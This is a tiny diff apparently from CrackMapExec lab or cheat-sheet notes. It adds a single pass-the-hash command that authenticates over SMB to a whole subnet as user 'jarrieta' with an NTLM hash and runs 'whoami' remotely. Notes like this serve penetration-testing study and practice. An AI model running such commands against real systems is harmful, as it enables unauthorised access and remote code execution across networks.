@@ -80,6 +80,8 @@ cmedb > hosts
 cmedb > creds
 
 
+crackmapexec smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+
 
 
 
